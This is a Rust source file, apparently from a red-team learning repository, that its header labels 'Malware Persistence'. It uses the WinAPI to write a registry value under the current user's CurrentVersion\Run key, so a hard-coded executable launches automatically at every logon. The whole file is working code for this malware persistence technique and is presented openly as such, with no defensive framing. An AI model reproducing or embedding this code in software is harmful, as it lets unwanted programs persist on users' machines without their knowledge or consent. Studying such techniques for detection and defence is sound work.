/*
    Malware Persistence through startup folder registry keys
    Credit: Cocomelonc
    @5mukx
*/

use std::{ffi::CString, ptr::null_mut};

use winapi::{
    shared::{minwindef::HKEY__, winerror::ERROR_SUCCESS}, 
    um::winreg::{RegCloseKey, RegOpenKeyExA, RegSetValueExA, HKEY_CURRENT_USER}
};
use winreg::enums::{RegType::REG_SZ, KEY_WRITE};


fn main(){
    unsafe{
        let mut hkey: *mut HKEY__ = null_mut();
        let exe = CString::new("C:\\Users\\Smukx\\Desktop\\Rust\\learn\\learn.exe").expect("CString Error");

        let path = CString::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run").expect("CString::new failed");
        
        let reg = RegOpenKeyExA(
            HKEY_CURRENT_USER,
            path.as_ptr(),
            0,
            KEY_WRITE,
            &mut hkey,
        );

        let reg_name = CString::new("smukx").expect("CString Error");

        if reg == ERROR_SUCCESS.try_into().unwrap(){
            RegSetValueExA(
                hkey,
                reg_name.as_ptr(),
                0, 
                REG_SZ as u32, 
                exe.as_ptr() as *const u8, 
                exe.as_bytes_with_nul().len() as u32
            );

            RegCloseKey(hkey);
        }
    }
}
